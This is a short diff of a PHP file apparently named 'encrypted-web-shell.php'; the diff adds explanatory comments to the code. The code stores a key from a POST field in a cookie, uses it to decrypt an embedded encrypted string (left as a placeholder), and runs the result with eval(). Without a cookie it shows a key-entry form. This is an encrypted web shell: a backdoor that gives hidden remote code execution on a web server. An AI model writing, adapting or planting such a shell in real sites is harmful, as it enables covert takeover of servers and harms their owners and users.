@@ -49,16 +49,20 @@ $code_enc = encrypt($key, $code_file);
 */
 
 if (!empty($_POST['dec'])) {
+	// Regardless of what the POST was, set it to the cookie. If it isn't the right key, it wont decrypt anyways :)
         setcookie("dec", $_POST['dec'], time()+3600);
         $_COOKIE['dec'] = $_POST['dec'];
         header("Refresh:0");
 }
 
 if (isset($_COOKIE['dec'])) {
+	// If the cookie is set , try decrypting and running
         $key = $_COOKIE['dec'];
 	$code = "paste encrypted string here";
         eval(decrypt($key, $code));
 } else {
+	// If no cookie is set or POST received, unset the cookie variables if they already (for some reason) exist
+	// Also deliver the input form by default.
         setcookie("dec", "", time() - 3600);
         $_COOKIE['dec'] = null;
         echo '<html><body><form action="encrypted-web-shell.php" method="post">
